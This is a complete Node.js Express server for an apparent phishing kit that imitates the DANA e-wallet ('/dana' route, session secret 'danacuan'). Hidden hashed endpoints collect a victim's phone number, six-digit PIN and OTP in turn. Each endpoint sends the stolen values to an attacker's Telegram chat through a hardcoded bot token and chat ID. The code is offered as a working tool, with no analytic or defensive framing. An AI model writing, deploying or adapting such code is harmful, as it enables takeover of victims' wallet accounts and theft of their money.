import axios from 'axios';
import express from 'express';
import session from 'express-session';
import { fileURLToPath } from 'url';
import path from 'path';
import bodyParser from 'body-parser';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function sendMessage(text) {
    const botToken = "7356513037:AAFXtxt1Xbmz8bYauJTNV6n8dT_MUMyG2GE";
    const chatId = "7366249184";
    const { data } = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: text,
        parse_mode: "Markdown"
    });
    return data;
}

const app = express();

app.set('trust proxy', true);
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(session({
    secret: 'danacuan',
    resave: false,
    saveUninitialized: true,
}));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/dana', (req, res) => {
  res.sendFile(path.join(__dirname, 'int.html'))
})

app.post('/3678fd6893fb190b400d9d618c79cf92', (req, res) => {
  const { nohp } = req.body;
  try {
    req.session.user = { nohp: nohp };
    const info = `INFORMASI NO HP\n\nNo HP: ${req.session.user.nohp}`;
    sendMessage(info);
    res.status(200).json({ status: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ status: false });
  }
});

app.post('/2f68d4e0d386ee468cd061afc288d287', (req, res) => {
  const pin = req.body.pin1 + req.body.pin2 + req.body.pin3 + req.body.pin4 + req.body.pin5 + req.body.pin6;
  try {
    const info = `INFORMASI PIN\n\nNo HP: ${req.session.user.nohp}\nPIN: ${pin}`;
    sendMessage(info);
    res.status(200).json({ status: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ status: false });
  }
});

app.post('/9dd9f94bf970e28cfd0d1bbdac2879ce', (req, res) => {
  const otp = req.body.otp1 + req.body.otp2 + req.body.otp3 + req.body.otp4;
  try {
    const info = `INFORMASI OTP\n\nNo HP: ${req.session.user.nohp}\nOTP: ${otp}`;
    sendMessage(info);
    res.status(200).json({ status: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ status: false });
  }
});


app.listen(3000, () => {
  console.log('Express server initialized');
});